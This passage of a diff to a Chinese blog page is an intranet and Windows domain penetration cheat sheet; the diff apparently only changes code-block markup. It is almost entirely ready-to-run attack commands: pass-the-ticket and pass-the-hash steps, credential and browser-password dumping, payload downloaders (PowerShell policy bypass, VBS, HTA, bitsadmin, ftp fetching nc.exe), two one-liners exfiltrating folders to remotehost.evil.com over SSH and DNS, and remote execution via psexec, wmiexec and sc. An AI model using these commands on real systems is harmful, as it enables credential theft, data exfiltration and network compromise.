 <p>先给出工具下载地址：<a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo/releases</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line">     域用户及口令</span><br><span class="line">     域控地址</span><br><span class="line">利用方法：</span><br><span class="line">     kekeo.exe /domain:vuln.local /user:adminstrator /password:12580/ /ptt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">利用条件：
+     域用户及口令
+     域控地址
+利用方法：
+     kekeo.exe /domain:vuln.local /user:adminstrator /password:12580/ /ptt</code></pre>
 
 <p>具体使用参考：<a href="http://www.cnblogs.com/backlion/p/6820744.html" target="_blank" rel="noopener">http://www.cnblogs.com/backlion/p/6820744.html</a></p>
 <p>3.相同密码登陆（hash碰撞）</p>
 <p>hash碰撞实际上就是利用hash传递来盲打。</p>
 <p>如果内网主机的本地管理员账户密码相同且允许账户登陆域内其他机器。</p>
 <p>在域环境中，利用pass the hash的渗透方式往往是这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.获得一台域主机权限；</span><br><span class="line">2.Dump内存获取用户hash（或明文）；</span><br><span class="line">3.通过pass the hash 或 pass the ticket尝试登陆其他主机；</span><br><span class="line">4.继续收集hash或明文，并尝试远程登陆；</span><br><span class="line">5.知道获得域管理员hash，登陆域控，最终成功控制整个域。</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">1.获得一台域主机权限；
+2.Dump内存获取用户hash（或明文）；
+3.通过pass the hash 或 pass the ticket尝试登陆其他主机；
+4.继续收集hash或明文，并尝试远程登陆；
+5.知道获得域管理员hash，登陆域控，最终成功控制整个域。</code></pre>
 
 <p>域登陆缓存mscash<br>使用reg命令提取sam、system、securit，然后用creddump7或者mimakatz提取mscash。</p>
 <p>4.利用漏洞配置不当获取更多主机权限</p>
 <ul>
 <li>常见应用漏洞：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion</code></pre>
 
 <ul>
 <li>常见语言反序列化漏洞</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php、Java、python、ruby、node.js</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">php、Java、python、ruby、node.js</code></pre>
 
 <ul>
 <li>数据库漏洞及配置不当</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当</code></pre>
 
 <ul>
 <li>内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）</li>
@@ -648,7 +558,7 @@
 <li>系统备份文件（ghost）中读密码</li>
 <li>在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe</code></pre>
 
 <ul>
 <li>ms08-067 远程溢出（极少能碰到）</li>
@@ -663,13 +573,14 @@
 </ul>
 <p>5.远程命令执行方式</p>
 <p>例如 at\schtasks\psexec\wmic\sc\ps 网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫5985，原理跟大家常说的 powershell remote是一样的，基于 winrm 服务，于是可以这样执行。又是一个系统自带的远程管理工具。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig</code></pre>
 
 <p>(3) 目标定位</p>
 <p>在有域控权限的条件下，需要找到某台机器（服务器、个人机、数据库）</p>
 <p>我们首先先将所有的域用户的详细信息都列举出来，通过详细名称（Full Name）确认其域用户。</p>
 <p><a href="http://rcoil.me/2018/08/【域渗透】-批量Net-User/" target="_blank" rel="noopener">【域渗透】批量Net-User</a>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsquery user - 查找目录中的用户。</span><br><span class="line">dsquery computer - 查找目录中的计算机。</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">dsquery user - 查找目录中的用户。
+dsquery computer - 查找目录中的计算机。</code></pre>
 
 <p>我们将上面的两条命令的执行结果结合起来进行归类。</p>
 <p>然后通过域控日志查找登陆IP或者机器。当然，除了日志还有别的方式，不限于日志。</p>
@@ -689,326 +600,458 @@
 <p>1.域内文件操作：</p>
 <p>Windows:</p>
 <p>(1)利用IPC$传输文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</span><br><span class="line">上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</span><br><span class="line">何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。</span><br><span class="line">如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是：</span><br><span class="line"></span><br><span class="line">copy 1.bat \\192.168.1.2\C$\</span><br><span class="line"></span><br><span class="line">反之就是下载。dir,copy,xcopy,move,type的参数都可以使用UNC路径</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。
+上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。
+何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\boot.ini。
+如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是：
+
+copy 1.bat \\192.168.1.2\C$\
+
+反之就是下载。dir,copy,xcopy,move,type的参数都可以使用UNC路径</code></pre>
 
 <p>(2)利用Telnet连接来传输文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端：nc -lvnp 23 &lt; nc.exe</span><br><span class="line">下载端：telnet ip -f c:\nc.exe</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">服务端：nc -lvnp 23 &lt; nc.exe
+下载端：telnet ip -f c:\nc.exe</code></pre>
 
 <p>(3)利用文件共享</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]</code></pre>
 
 <p>(4)powershell文件下载</p>
 <p>powershell突破限制执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\1.ps1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">powershell -ExecutionPolicy Bypass -File .\1.ps1</code></pre>
 
 <p>1.ps1内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$d = New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http://baidu.com/file.zip&quot;,&quot;c:/1.zip&quot;)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">$d = New-Object System.Net.WebClient
+$d.DownloadFile(&quot;http://baidu.com/file.zip&quot;,&quot;c:/1.zip&quot;)</code></pre>
 
 <p>(5)vbs脚本下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">xPost.Open &quot;GET&quot;,&quot;http://192.168.206.101/file.zip&quot;,0</span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=createObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">sGet.Mode=3</span><br><span class="line">sGet.Type=1</span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write xPost.ResponseBody</span><br><span class="line">sGet.SaveToFile &quot;c:\file.zip&quot;,2</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)
+xPost.Open &quot;GET&quot;,&quot;http://192.168.206.101/file.zip&quot;,0
+xPost.Send()
+set sGet=createObject(&quot;ADODB.Stream&quot;)
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile &quot;c:\file.zip&quot;,2</code></pre>
 
 <p>下载执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">cscript test.vbs</code></pre>
 
 <p>(6)bitsadmin win03测试没有，win08有：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://baidu.com/file.zip c:\1.zip</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">bitsadmin /transfer n http://baidu.com/file.zip c:\1.zip</code></pre>
 
 <p>(7)hta 保存为.hta文件后运行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var Object = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);</span><br><span class="line">Object.open(&quot;GET&quot;,&quot;http://192.168.206.101/demo.php.zip&quot;,false);</span><br><span class="line">Object.send();</span><br><span class="line">if (Object.Status == 200)</span><br><span class="line">&#123;</span><br><span class="line">    var Stream = new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">    Stream.Open();</span><br><span class="line">    Stream.Type = 1;</span><br><span class="line">    Stream.Write(Object.ResponseBody);</span><br><span class="line">    Stream.SaveToFile(&quot;C:\\demo.zip&quot;, 2);</span><br><span class="line">    Stream.Close();</span><br><span class="line">&#125;</span><br><span class="line">window.close();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;HTA:APPLICATION ID=&quot;test&quot;</span><br><span class="line">WINDOWSTATE = &quot;minimize&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+var Object = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
+Object.open(&quot;GET&quot;,&quot;http://192.168.206.101/demo.php.zip&quot;,false);
+Object.send();
+if (Object.Status == 200)
+&#123;
+    var Stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.SaveToFile(&quot;C:\\demo.zip&quot;, 2);
+    Stream.Close();
+&#125;
+window.close();
+&lt;/script&gt;
+&lt;HTA:APPLICATION ID=&quot;test&quot;
+WINDOWSTATE = &quot;minimize&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 
 <p>Linux:</p>
 <p>(1)perl脚本文件下载 kali下测试成功，centos5.5下，由于没有LWP::Simple这个，导致下载失败</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl</span><br><span class="line">use LWP::Simple</span><br><span class="line">getstore(&quot;http://baidu.com/file.zip&quot;, &quot;/root/1.zip&quot;);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">#!/usr/bin/perl
+use LWP::Simple
+getstore(&quot;http://baidu.com/file.zip&quot;, &quot;/root/1.zip&quot;);</code></pre>
 
 <p>(2)python脚本文件下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import urllib2</span><br><span class="line">u = urllib2.urlopen(&apos;http://baidu.com/file.zip&apos;)</span><br><span class="line">localFile = open(&apos;/root/1.zip&apos;, &apos;w&apos;)</span><br><span class="line">localFile.write(u.read())</span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">#!/usr/bin/python
+import urllib2
+u = urllib2.urlopen(&apos;http://baidu.com/file.zip&apos;)
+localFile = open(&apos;/root/1.zip&apos;, &apos;w&apos;)
+localFile.write(u.read())
+localFile.close()</code></pre>
 
 <p>(3)ruby文件下载 centos5.5没有ruby环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;net/http&apos;</span><br><span class="line">Net::HTTP.start(&quot;www.lemon.com&quot;) &#123; |http|</span><br><span class="line">r = http.get(&quot;/file.zip&quot;)</span><br><span class="line">open(&quot;/root/1.zip&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">#!/usr/bin/ruby
+require &apos;net/http&apos;
+Net::HTTP.start(&quot;www.lemon.com&quot;) &#123; |http|
+r = http.get(&quot;/file.zip&quot;)
+open(&quot;/root/1.zip&quot;, &quot;wb&quot;) &#123; |file|
+file.write(r.body)
+&#125;
+&#125;</code></pre>
 
 <p>(4)wget文件下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://baidu.com/file.zip -P /root/1.zip</span><br><span class="line"></span><br><span class="line">其中-P是保存到指定目录</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">wget http://baidu.com/file.zip -P /root/1.zip
+
+其中-P是保存到指定目录</code></pre>
 
 <p>(5)一边tar一边ssh上传：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf - /some/localfolder | ssh remotehost.evil.com &quot;cd /some/path/name;tar zxpf -&quot;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">tar zcf - /some/localfolder | ssh remotehost.evil.com &quot;cd /some/path/name;tar zxpf -&quot;</code></pre>
 
 <p>(6)利用dns传输数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf - localfolder | xxd -p -c 16 |  while read line; do host $line.domain.com remotehost.evil.com; done</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">tar zcf - localfolder | xxd -p -c 16 |  while read line; do host $line.domain.com remotehost.evil.com; done</code></pre>
 
 <p>其他传输方式：</p>
 <p>(1)php脚本文件下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $data = @file(&quot;http://example.com/file&quot;);</span><br><span class="line">        $lf = &quot;local_file&quot;;</span><br><span class="line">        $fh = fopen($lf, &apos;w&apos;);</span><br><span class="line">        fwrite($fh, $data[0]);</span><br><span class="line">        fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">&lt;?php
+        $data = @file(&quot;http://example.com/file&quot;);
+        $lf = &quot;local_file&quot;;
+        $fh = fopen($lf, &apos;w&apos;);
+        fwrite($fh, $data[0]);
+        fclose($fh);
+?&gt;</code></pre>
 
 <p>(2)ftp文件下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;**windows下**</span><br><span class="line">&gt;ftp下载是需要交互，但是也可以这样去执行下载</span><br><span class="line">open host</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">bin</span><br><span class="line">lcd c:/</span><br><span class="line">get file</span><br><span class="line">bye</span><br><span class="line">&gt;将这个内容保存为1.txt， ftp -s:&quot;c:\1.txt&quot;</span><br><span class="line">&gt;在mssql命令执行里面(不知道为什么单行执行一个echo,总是显示两行),个人一般喜欢这样</span><br><span class="line">echo open host &gt;&gt; c:\hh.txt &amp; echo username &gt;&gt; c:\hh.txt &amp; echo password &gt;&gt;c:\hh.txt &amp; echo bin &gt;&gt;c:\hh.txt &amp; echo lcd c:\&gt;&gt;c:\hh.txt &amp; echo get nc.exe  &gt;&gt;c:\hh.txt &amp; echo bye &gt;&gt;c:\hh.txt &amp; ftp -s:&quot;c:\hh.txt&quot; &amp; del c:\hh.txt</span><br><span class="line"></span><br><span class="line">&gt;**linux下**</span><br><span class="line">&gt;bash文件</span><br><span class="line">ftp 127.0.0.1</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">&gt;或者使用busybox里面的tftp或者ftp</span><br><span class="line">&gt;busybox ftpget -u test -P test 127.0.0.1 file.zip</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">&gt;**windows下**
+&gt;ftp下载是需要交互，但是也可以这样去执行下载
+open host
+username
+password
+bin
+lcd c:/
+get file
+bye
+&gt;将这个内容保存为1.txt， ftp -s:&quot;c:\1.txt&quot;
+&gt;在mssql命令执行里面(不知道为什么单行执行一个echo,总是显示两行),个人一般喜欢这样
+echo open host &gt;&gt; c:\hh.txt &amp; echo username &gt;&gt; c:\hh.txt &amp; echo password &gt;&gt;c:\hh.txt &amp; echo bin &gt;&gt;c:\hh.txt &amp; echo lcd c:\&gt;&gt;c:\hh.txt &amp; echo get nc.exe  &gt;&gt;c:\hh.txt &amp; echo bye &gt;&gt;c:\hh.txt &amp; ftp -s:&quot;c:\hh.txt&quot; &amp; del c:\hh.txt
+
+&gt;**linux下**
+&gt;bash文件
+ftp 127.0.0.1
+username
+password
+get file
+exit
+
+&gt;或者使用busybox里面的tftp或者ftp
+&gt;busybox ftpget -u test -P test 127.0.0.1 file.zip</code></pre>
 
 <p>(3)nc文件传输：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端:cat file | nc -l 1234</span><br><span class="line">下载端:nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">服务端:cat file | nc -l 1234
+下载端:nc host_ip 1234 &gt; file</code></pre>
 
 <p>(4)使用SMB传送文件</p>
 <p>本地linux的smb的环境配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;vi /etc/samba/smb.conf</span><br><span class="line">[test]</span><br><span class="line">    comment = File Server Share</span><br><span class="line">    path = /tmp/</span><br><span class="line">    browseable = yes</span><br><span class="line">    writable = yes</span><br><span class="line">    guest ok = yes</span><br><span class="line">    read only = no</span><br><span class="line">    create mask = 0755</span><br><span class="line">&gt;service samba start</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">&gt;vi /etc/samba/smb.conf
+[test]
+    comment = File Server Share
+    path = /tmp/
+    browseable = yes
+    writable = yes
+    guest ok = yes
+    read only = no
+    create mask = 0755
+&gt;service samba start</code></pre>
 
 <p>下载端：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use o: \\192.168.206.129\test</span><br><span class="line">dir o:</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">net use o: \\192.168.206.129\test
+dir o:</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201902/1344396-20190208110305087-1718640.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201902/1344396-20190208110305087-1718640.png" alt="img"></a>/</p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201902/1344396-20190208110305087-1718640.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201902/1344396-20190208110305087-1718640.png" srcset="/img/loading.gif" alt="img"></a>/</p>
 <p>2.域内运行命令</p>
 <p>(1)利用计划任务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.0.100 15:00 c:\hack.bat</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">at \\192.168.0.100 15:00 c:\hack.bat</code></pre>
 
 <p>(2)PSexec</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用</span><br><span class="line"></span><br><span class="line">psexec \\192.168.0.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">   -s 参数用来以system权限执行</span><br><span class="line">   –accepteula 绕过第一次运行的弹窗</span><br><span class="line">   -c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">   -d 不等待程序执行完就返回</span><br><span class="line"></span><br><span class="line">使用：psexec \\192.168.1.2 c:\hack.bat</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">psexec针对远程建立连接的认证方式有两种，一种先建立ipc连接，然后直接用
+
+psexec \\192.168.0.100 cmd命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。
+
+参数：
+   -s 参数用来以system权限执行
+   –accepteula 绕过第一次运行的弹窗
+   -c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）
+   -d 不等待程序执行完就返回
+
+使用：psexec \\192.168.1.2 c:\hack.bat</code></pre>
 
 <p>(3)wmiexec</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">T00ls大牛写的一款工具。早就传开了。</span><br><span class="line">半交互模式：</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</span><br><span class="line"></span><br><span class="line">单个命令执行的模式：</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 192.168.1.1 username password &quot;command&quot;</span><br><span class="line"></span><br><span class="line">如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</span><br><span class="line"></span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1  </span><br><span class="line">wce -s [hash] </span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">T00ls大牛写的一款工具。早就传开了。
+半交互模式：
+cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password
+
+单个命令执行的模式：
+cscript.exe wmiexec.vbs /cmd 192.168.1.1 username password &quot;command&quot;
+
+如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。
+
+cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1  
+wce -s [hash] 
+cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1</code></pre>
 
 <p>(4)SC创建服务执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、系统权限(其中test为服务名)</span><br><span class="line">sc \\DC1 create test binpath= c:\cmd.exe</span><br><span class="line">sc \\DC1 start test</span><br><span class="line">sc \\DC1 delete test</span><br><span class="line"></span><br><span class="line">2.指定用户权限启动</span><br><span class="line">sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test</span><br><span class="line">sc \\DC1 start test</span><br></pre></td></tr></table></figure>
-    </div>
+<pre><code class="hljs undefined">1、系统权限(其中test为服务名)
+sc \\DC1 create test binpath= c:\cmd.exe
+sc \\DC1 start test
+sc \\DC1 delete test
 
-    
-    
-    
-        
-      
-
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/内网/" rel="tag"># 内网</a>
-            
-          </div>
-        
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
+2.指定用户权限启动
+sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test
+sc \\DC1 start test</code></pre>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/内网/">内网</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/内网/">内网</a>
+                    
+                  </div>
+                
+              </div>
               
-                <a href="/2020/03/03/记一次80万字符过狗注入/" rel="next" title="记一次80万字符过狗注入">
-                  <i class="fa fa-chevron-left"></i> 记一次80万字符过狗注入
-                </a>
